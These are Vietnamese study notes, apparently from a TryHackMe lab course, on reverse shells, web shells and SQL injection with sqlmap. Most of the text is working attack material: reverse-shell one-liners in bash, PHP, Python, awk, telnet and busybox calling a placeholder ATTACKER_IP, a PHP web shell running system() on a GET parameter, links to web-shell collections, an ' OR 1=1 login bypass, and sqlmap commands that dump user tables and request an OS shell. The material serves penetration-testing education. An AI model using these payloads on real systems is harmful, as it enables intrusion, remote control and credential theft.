* Ví dụ sử dụng (Lắng nghe các Shell đảo ngược)

**attacker@kali:~$ ncat -lvnp 4444**

**Ncat: Version 7.94SVN ( https://nmap.org/ncat )**

**Ncat: Listening on \[::]:443**

**Ncat: Listening on 0.0.0.0:443**

* Ví dụ sử dụng (Lắng nghe Reverse Shell bằng SSL)

**attacker@kali:~$ ncat --ssl -lvnp 4444**

**Ncat: Version 7.94SVN ( https://nmap.org/ncat )**

**Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.**

**Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F**

**Ncat: Listening on \[::]:443**

**Ncat: Listening on 0.0.0.0:443**

Tùy chọn này **--ssl** cho phép mã hóa SSL cho người nghe.

* **Socat**

Đây là tiện ích cho phép bạn tạo kết nối socket giữa hai nguồn dữ liệu, trong trường hợp này là hai máy chủ khác nhau.

Ví dụ sử dụng mặc định (Lắng nghe Reverse Shell):

**attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT**

**2024/09/23 15:44:38 socat\[41135] N listening on AF=2 0.0.0.0:443\\**

Lệnh trên sử dụng **-d** tùy chọn để bật đầu ra chi tiết; sử dụng lại **( -d -d)** sẽ tăng mức độ chi tiết của lệnh. **TCP-LISTEN:443** Tùy chọn này tạo một trình lắng nghe TCP trên cổng **443**, thiết lập một socket máy chủ cho các kết nối đến. Cuối cùng, tùy chọn STDOUT sẽ chuyển hướng mọi dữ liệu đến thiết bị đầu cuối.



#### **Tải trọng của vỏ đạn(Shell Payloads)**

Shell Payload có thể là lệnh hoặc tập lệnh cho phép shell tiếp cận kết nối đến trong trường hợp shell liên kết hoặc kết nối gửi trong trường hợp shell đảo ngược.

Hãy cùng khám phá một số payload có thể được sử dụng trong hệ điều hành Linux để hiển thị shell thông qua shell ngược phổ biến nhất .



###### **Đập(Bash)**

**Bash Reverse Shell thông thường(Normal Bash Reverse Shell)**

**target@tryhackme:~$ bash -i >\& /dev/tcp/ATTACKER\_IP/443 0>\&1**

Shell đảo ngược này  khởi tạo một **shell bash** tương tác, chuyển hướng đầu vào và đầu ra thông qua kết nối TCP đến IP của kẻ tấn công **( ATTACKER\_IP )** trên cổng **443**. **>\&** Toán tử kết hợp cả đầu ra chuẩn và lỗi chuẩn.



**Bash Đọc Dòng Đảo  Ngược Shell(Bash Read Line Reverse Shell)**

**target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER\_IP/443; cat <\&5 | while read line; do $line 2>\&5 >\&5; done**

Shell đảo ngược này  tạo một mô tả tệp mới ( **5** trong trường hợp này) và kết nối với một socket TCP . Nó sẽ đọc và thực thi các lệnh từ socket, gửi đầu ra trở lại qua cùng socket đó.



**Bash với File Descriptor 196  Reverse Shell(Bash With File Descriptor 196 Reverse Shell)**

**target@tryhackme:~$ 0<\&196;exec 196<>/dev/tcp/ATTACKER\_IP/443; sh <\&196 >\&196 2>\&196**

Shell đảo ngược này  sử dụng một mô tả tệp ( **196** trong trường hợp này) để thiết lập kết nối TCP . Nó cho phép shell đọc lệnh từ mạng và gửi đầu ra trở lại thông qua cùng một kết nối.



**Bash với File Descriptor 5  Reverse Shell(Bash With File Descriptor 5 Reverse Shell)**

**target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER\_IP/443 0<\&5 1>\&5 2>\&5**

Tương tự như ví dụ đầu tiên, lệnh này mở một shell **( bash -i)**, nhưng sử dụng mô tả tệp **5** để nhập và xuất, cho phép phiên tương tác qua kết nối TCP .



###### **PHP**

**PHP Reverse Shell sử dụng hàm exec**

**target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER\_IP",443);exec("sh <\&3 >\&3 2>\&3");'**

Shell đảo ngược này  tạo ra một kết nối socket tới IP của kẻ tấn công trên cổng **443** và sử dụng  **exec** hàm này để thực thi shell, chuyển hướng đầu vào và đầu ra chuẩn.



**PHP Reverse Shell sử dụng hàm shell\_exec**

**target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER\_IP",443);shell\_exec("sh <\&3 >\&3 2>\&3");'**

Tương tự như lệnh trước, nhưng sử dụng  **shell\_exec** hàm.



**PHP Reverse Shell Sử dụng hàm hệ thống**

**target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER\_IP",443);system("sh <\&3 >\&3 2>\&3");'**

Shell đảo ngược này  sử dụng  **system** hàm thực thi lệnh và đưa kết quả ra trình duyệt.



**PHP Reverse Shell sử dụng hàm passthru**

**target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER\_IP",443);passthru("sh <\&3 >\&3 2>\&3");'**

Hàm này **passthru** thực thi một lệnh và gửi kết quả thô trở lại trình duyệt. Điều này hữu ích khi làm việc với dữ liệu nhị phân.



**PHP Reverse Shell sử dụng hàm popen**

**target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER\_IP",443);popen("sh <\&3 >\&3 2>\&3", "r");'**

Shell đảo ngược này  được sử dụng **popen** để mở con trỏ tệp tiến trình, cho phép shell được thực thi.



###### **Trăn(Python)**

﻿Xin lưu ý, các đoạn mã sau đây yêu cầu sử dụng **python -c** để chạy, được chỉ định bằng trình giữ chỗ PY-C

**Python Reverse Shell bằng cách xuất biến môi trường**

**target@tryhackme:~$ export RHOST="ATTACKER\_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'**

Shell đảo ngược này  thiết lập máy chủ và cổng từ xa làm biến môi trường, tạo kết nối socket và sao chép mô tả tệp socket cho đầu vào/đầu ra chuẩn.



**Python Reverse Shell sử dụng mô-đun subprocess**

**target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'**

Shell đảo ngược này sử dụng **subprocess** mô-đun để tạo ra một shell và thiết lập một môi trường tương tự như lệnh Python Reverse Shell bằng cách xuất biến môi trường.



**Vỏ đảo ngược Python ngắn**

**PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER\_IP",443));\[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'**

Shell đảo ngược này tạo ra một socket **( s)**, kết nối với kẻ tấn công và chuyển hướng đầu vào, đầu ra và lỗi chuẩn đến socket bằng cách sử dụng  **os.dup2()**.



###### **OTHERS**

**Telnet**

**target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF \&\& telnet ATTACKER\_IP443 0<$TF | sh 1>$TF**

Shell đảo ngược này tạo ra một đường ống có tên bằng cách sử dụng **mkfifo** và kết nối với kẻ tấn công thông qua Telnet trên IP **ATTACKER\_IP** và cổng **443**.



**AWK**

**target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER\_IP/443"; while(42) { do{ printf "shell>" |\& s; s |\& getline c; if(c){ while ((c |\& getline) > 0) print $0 |\& s; close(c); } } while(c != "exit") close(s); }}' /dev/null**

Shell đảo ngược này sử dụng khả năng TCP tích hợp của AWK để kết nối với **ATTACKER\_IP:443**. Nó đọc các lệnh từ kẻ tấn công và thực thi chúng. Sau đó, nó gửi kết quả trở lại qua cùng một kết nối TCP .



**BusyBox**

**target@tryhackme:~$ busybox nc ATTACKER\_IP 443 -e sh**

Shell đảo ngược BusyBox này sử dụng Netcat **( nc)** để kết nối với kẻ tấn công tại  **ATTACKER\_IP:443**. Sau khi kết nối, nó sẽ thực thi /bin/sh, để lộ dòng lệnh cho kẻ tấn công.



#### **Vỏ Web**

Web Shell là một tập lệnh được viết bằng ngôn ngữ được hỗ trợ bởi máy chủ web bị xâm nhập, thực thi các lệnh thông qua chính máy chủ web đó. Web Shell thường là một tệp chứa mã thực thi lệnh và xử lý tệp. Nó có thể được ẩn bên trong ứng dụng hoặc dịch vụ web bị xâm nhập, khiến nó khó bị phát hiện và rất phổ biến đối với kẻ tấn công.

Web shell có thể được viết bằng nhiều ngôn ngữ được máy chủ web hỗ trợ, như PHP , ASP, JSP và thậm chí cả các tập lệnh CGI đơn giản.



###### **Ví dụ về PHP Web Shell**

**Chúng ta hãy xem một ví dụ về web shell PHP để hiểu cách thức hoạt động của quy trình này:**

**<?php**

**if (isset($\_GET\['cmd'])) {**

&nbsp;   \*\*system($\\\_GET\\\['cmd']);\*\*


**}**

**?>**

Shell ở trên có thể được lưu vào một tệp có phần mở rộng PHP , như , và sau đó kẻ tấn công có thể tải lên máy chủ web bằng cách khai thác các lỗ hổng như Tải tệp không giới hạn ,  Bao gồm tệp , Tiêm lệnh ,  v.v.  hoặc bằng cách truy cập trái phép vào tệp đó.  **shell.php**

Sau khi web shell được triển khai trên máy chủ, nó có thể được truy cập thông qua URL nơi web shell được lưu trữ, trong ví dụ này  là **http://victim.com/uploads/shell.php** . Như đã quan sát từ đoạn mã trong **shell.php,** chúng ta cần cung cấp phương thức GET và giá trị của biến , chứa lệnh mà kẻ tấn công muốn thực thi **cmd** . Ví dụ: nếu chúng ta muốn thực thi lệnh  **whoami**,  yêu cầu đến URL phải là:

**http ://victim.com/uploads/shell. php ?cmd=whoami**

Lệnh trên sẽ thực thi lệnh whoami và hiển thị kết quả trên trình duyệt web.



###### **Web Shell hiện có sẵn trực tuyến**

Sức mạnh của các ngôn ngữ được máy chủ web hỗ trợ có thể tạo ra các web shell với nhiều chức năng và đồng thời tránh bị phát hiện. Hãy cùng khám phá một số web shell phổ biến nhất có thể tìm thấy trực tuyến.

* **p0wny-shell(https://github.com/flozz/p0wny-shell) -** Một shell web PHP đơn giản cho phép thực thi lệnh từ xa.
* **b374k shell(https://github.com/b374k/b374k) -** Một web shell PHP giàu tính năng hơn với chức năng quản lý tệp và thực thi lệnh, cùng nhiều chức năng khác.
* **c99 shell(https://www.r57shell.net/single.php?id=13) -** Một shell web PHP mạnh mẽ và nổi tiếng với nhiều chức năng mở rộng.

Bạn có thể tìm thêm nhiều web shell khác tại : **https://www.r57shell.net/index.php** .



# **SQLMap**

#### **Introduction**

Tiêm nhiễm SQL là một lỗ hổng phổ biến và từ lâu đã là chủ đề nóng trong an ninh mạng. Để hiểu về lỗ hổng này, trước tiên chúng ta cần tìm hiểu cơ sở dữ liệu là gì và cách các trang web tương tác với cơ sở dữ liệu.



Cơ sở dữ liệu là tập hợp dữ liệu có thể được lưu trữ, sửa đổi và truy xuất. Nó lưu trữ dữ liệu từ nhiều ứng dụng theo định dạng có cấu trúc, giúp việc lưu trữ, sửa đổi và truy xuất trở nên dễ dàng và hiệu quả. Bạn tương tác với nhiều trang web hàng ngày. Trang web chứa một số trang web yêu cầu người dùng nhập thông tin. Ví dụ: một trang web có trang đăng nhập yêu cầu bạn nhập thông tin đăng nhập và sau khi bạn nhập, trang web sẽ kiểm tra xem thông tin đăng nhập có chính xác không và đăng nhập cho bạn nếu đúng. Vì có nhiều người dùng đăng nhập vào trang web đó, làm thế nào trang web đó ghi lại tất cả dữ liệu của những người dùng này và xác minh chúng trong quá trình xác thực? Tất cả điều này được thực hiện với sự trợ giúp của cơ sở dữ liệu. Các trang web này có cơ sở dữ liệu lưu trữ thông tin người dùng và các thông tin khác và truy xuất thông tin đó khi cần. Vì vậy, khi bạn nhập thông tin đăng nhập vào trang đăng nhập của một trang web, trang web sẽ tương tác với cơ sở dữ liệu của nó để kiểm tra xem thông tin đăng nhập này có chính xác không. Tương tự, nếu bạn có một trường nhập liệu để tìm kiếm một thứ gì đó, ví dụ, trường nhập liệu của một trang web hiệu sách cho phép bạn tìm kiếm những cuốn sách có sẵn để bán. Khi bạn tìm kiếm bất kỳ cuốn sách nào, trang web sẽ tương tác với cơ sở dữ liệu để lấy thông tin về cuốn sách đó và hiển thị trên trang web.



Bây giờ, chúng ta đã biết rằng trang web yêu cầu cơ sở dữ liệu truy xuất, lưu trữ hoặc sửa đổi bất kỳ dữ liệu nào. Vậy tương tác này diễn ra như thế nào? Cơ sở dữ liệu được quản lý bởi các Hệ thống Quản lý Cơ sở dữ liệu (DBMS), chẳng hạn như MySQL, PostgreSQL, SQLite hoặc Microsoft SQL Server. Các hệ thống này hiểu Ngôn ngữ Truy vấn Có Cấu trúc ( SQL ). Vì vậy, bất kỳ ứng dụng hoặc trang web nào cũng sử dụng truy vấn SQL khi tương tác với cơ sở dữ liệu.



#### **Lỗ hổng SQL Injection**

Trong bài tập trước, chúng ta đã nghiên cứu cách các trang web và ứng dụng tương tác với cơ sở dữ liệu để lưu trữ, chỉnh sửa và truy xuất dữ liệu theo cấu trúc. Trong bài tập này, chúng ta sẽ xem cách tương tác giữa ứng dụng và cơ sở dữ liệu diễn ra thông qua các truy vấn SQL và cách kẻ tấn công có thể lợi dụng các truy vấn SQL này để thực hiện các cuộc tấn công tiêm nhiễm SQL .



Lưu ý : Trước khi tiến hành, vui lòng đảm bảo rằng bạn chỉ thử phương pháp tiêm SQL thủ công hoặc tự động sau khi được chủ sở hữu ứng dụng cho phép.



Hãy lấy ví dụ về một trang đăng nhập yêu cầu bạn nhập tên người dùng và mật khẩu để đăng nhập. Hãy cung cấp cho trang này dữ liệu sau:



**Username: John**

**Password: Un@detectable444**



Sau khi bạn nhập tên người dùng và mật khẩu, trang web sẽ nhận thông tin đó, thực hiện truy vấn SQL với thông tin đăng nhập của bạn và gửi đến cơ sở dữ liệu.

**SELECT \* FROM users WHERE username = 'John' AND password = 'Un@detectable444';**



Truy vấn này sẽ được thực thi trong cơ sở dữ liệu. Theo truy vấn này, cơ sở dữ liệu sẽ kiểm tra tên người dùng  Johnvà mật khẩu của  Un@detectable444. Nếu tìm thấy người dùng như vậy, nó sẽ trả về thông tin chi tiết của người dùng đó cho ứng dụng. Lưu ý rằng truy vấn trên chỉ thành công nếu cả tên người dùng và mật khẩu đều trùng khớp trong cơ sở dữ liệu vì chúng được phân tách bằng boolean "AND".



Đôi khi, khi dữ liệu đầu vào không được kiểm tra đúng cách, nghĩa là dữ liệu đầu vào của người dùng không được xác thực, kẻ tấn công có thể thao túng dữ liệu đầu vào và viết các truy vấn SQL sẽ được thực thi trong cơ sở dữ liệu và thực hiện các hành động mong muốn của kẻ tấn công. Tấn công tiêm nhiễm SQL có tác động rất tai hại trong thế giới kỹ thuật số này vì tất cả các tổ chức đều lưu trữ dữ liệu, bao gồm cả thông tin quan trọng, bên trong cơ sở dữ liệu, và một cuộc tấn công tiêm nhiễm SQL thành công có thể làm tổn hại đến dữ liệu quan trọng của họ.



Giả sử trang đăng nhập trang web mà chúng ta đã thảo luận ở trên thiếu xác thực và kiểm tra đầu vào. Điều này có nghĩa là nó dễ bị tấn công SQL injection. Kẻ tấn công không biết mật khẩu của người dùng John. Chúng sẽ nhập thông tin sau vào các trường được cung cấp:



**Username: John**

**Password: abc' OR 1=1;-- -**



Lần này, kẻ tấn công đã nhập một chuỗi ngẫu nhiên abc và một chuỗi được chèn vào ' OR 1=1;-- -. Truy vấn SQL mà trang web sẽ gửi đến cơ sở dữ liệu giờ sẽ trở thành như sau:

**SELECT \* FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';**

Câu lệnh này trông giống với truy vấn SQL trước đó nhưng giờ thêm một điều kiện khác với toán tử **OR**. Truy vấn này sẽ xem có người dùng John không. Sau đó, nó sẽ kiểm tra xem John có mật khẩu không **abc**(anh ta không thể có vì kẻ tấn công đã nhập mật khẩu ngẫu nhiên). Về lý tưởng, truy vấn sẽ thất bại ở đây vì nó mong đợi cả tên người dùng và mật khẩu đều chính xác, vì có một **AND** toán tử ở giữa chúng. Tuy nhiên, truy vấn này có một điều kiện khác, **OR**, giữa mật khẩu và một câu lệnh **1=1**. Bất kỳ điều kiện nào trong số chúng là đúng sẽ làm cho toàn bộ truy vấn SQL thành công. Mật khẩu không thành công, vì vậy truy vấn sẽ kiểm tra điều kiện tiếp theo, điều kiện này sẽ kiểm tra xem **1=1**. Như chúng ta đã biết, **1=1** luôn luôn đúng, vì vậy nó sẽ bỏ qua mật khẩu ngẫu nhiên được nhập trước đó và coi câu lệnh này là đúng, điều này sẽ thực thi truy vấn này thành công. **-- -** Ở cuối truy vấn sẽ bình luận bất kỳ điều gì sau 1=1, điều này có nghĩa là truy vấn sẽ được thực thi thành công và kẻ tấn công sẽ đăng nhập vào tài khoản người dùng của John.



Một trong những điều quan trọng cần lưu ý ở đây là việc sử dụng dấu nháy đơn **'** sau **abc**. Nếu không có dấu nháy đơn này, **'** toàn bộ chuỗi **'abc OR 1=1;-- -'** sẽ được coi là mật khẩu, điều này không có chủ đích. Tuy nhiên, nếu chúng ta thêm dấu nháy đơn **'** sau **abc**, mật khẩu sẽ trông như thế **'abc' OR 1=1;---'** này , bao gồm chuỗi abc gốc trong truy vấn và cho phép chúng ta đưa ra một điều kiện logic **OR 1=1**, điều kiện này luôn đúng.



#### **Công cụ tiêm SQL tự động**

Thực hiện một cuộc tấn công SQL injection bao gồm việc phát hiện lỗ hổng SQL injection bên trong ứng dụng và thao tác với cơ sở dữ liệu. Tuy nhiên, việc thực hiện thủ công tất cả những điều này có thể tốn thời gian và công sức.



Lưu ý:  Trước khi tiếp tục, cần lưu ý rằng các lệnh được giải thích trong nhiệm vụ này sẽ không hoạt động bên trong AttackBox vì đây là một URL giả định dễ bị tấn công chỉ để giải thích. Tuy nhiên, nhiệm vụ tiếp theo sẽ cung cấp cho bạn một ví dụ thực tế thông qua một URL dễ bị tấn công để thực hiện cuộc tấn công này.



SQLMap là một công cụ tự động phát hiện và khai thác lỗ hổng SQL injection trong các ứng dụng web. Nó giúp đơn giản hóa quá trình xác định các lỗ hổng này. Công cụ này được tích hợp sẵn trong một số bản phân phối Linux , nhưng bạn có thể dễ dàng cài đặt nếu chưa có.



Vì đây là công cụ dòng lệnh, bạn phải mở terminal của hệ điều hành Linux để sử dụng. Lệnh với SQLMap sẽ liệt kê tất cả các cờ hiệu khả dụng mà bạn có thể sử dụng. Nếu bạn không muốn tự tay thêm cờ hiệu vào từng lệnh, hãy sử dụng cờ hiệu với SQLMap . Khi bạn sử dụng cờ hiệu này, công cụ sẽ hướng dẫn bạn từng bước và đặt câu hỏi để hoàn tất quá trình quét, khiến đây trở thành một lựa chọn hoàn hảo cho người mới bắt đầu.**--help--wizard**



**1. Lệnh Cơ Bản Nhất (Xác Định Mục Tiêu)**

* **-u (URL)**: Chỉ định URL mục tiêu cần kiểm tra. Đây là tùy chọn quan trọng nhất.

**sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"**

* **--batch**: Tự động trả lời "yes" cho tất cả các câu hỏi mà SQLMap đưa ra. Rất tiện để chạy mà không cần tương tác.

**sqlmap -u "http://example.com/page.php?id=1" --batch**



**2. Lệnh Liệt Kê \& Thu Thập Thông Tin (Enumeration)**

* **--dbs:** Liệt kê tất cả các databases có trên hệ thống.
* 

**sqlmap -u "URL" --dbs**

* **--current-db:** Hiển thị tên của database hiện tại mà ứng dụng web đang sử dụng.
* **-D \[tên\_database] --tables:** Liệt kê tất cả các bảng (tables) trong một database cụ thể.

**sqlmap -u "URL" -D acuart --tables**

* **-D \[db] -T \[table] --columns:** Liệt kê tất cả các cột (columns) trong một bảng cụ thể.
* 

**sqlmap -u "URL" -D acuart -T users --columns**



**3. Lệnh Trích Xuất Dữ Liệu (Dumping)**

* **-D \[db] -T \[table] -C \[columns] --dump: "Dump"** (trích xuất) dữ liệu từ các cột bạn chỉ định.

**sqlmap -u "URL" -D acuart -T users -C "uname,pass" --dump**



Nếu bạn muốn lấy hết dữ liệu từ một bảng, chỉ cần bỏ -C.

**sqlmap -u "URL" -D acuart -T users --dump**



**4. Các Tùy Chọn Nâng Cao \& Hữu Ích**

* **--data:** Dùng cho các yêu cầu POST, khi dữ liệu được gửi đi trong thân của request (ví dụ: form đăng nhập).
* 

**sqlmap -u "http://example.com/login.php" --data="username=admin\&password=123"**

* **-r \[request\_file.txt]:** Đọc toàn bộ yêu cầu HTTP từ một file. Rất hữu ích khi làm việc với Burp Suite. Bạn chỉ cần lưu request vào file và đưa cho SQLMap.
* 

**sqlmap -r request.txt**

* **--os-shell:** Cố gắng có được một shell (giao diện dòng lệnh) trên hệ điều hành của máy chủ. Đây là mục tiêu cuối cùng, cho phép bạn kiểm soát hoàn toàn máy chủ.
* **--level / --risk:** Tăng mức độ kiểm tra. Mặc định là level=1 và risk=1. Tăng lên (--level=5 --risk=3) sẽ khiến SQLMap thử nhiều loại payload phức tạp hơn, tốn thời gian hơn nhưng có thể phát hiện các lỗ hổng khó tìm.
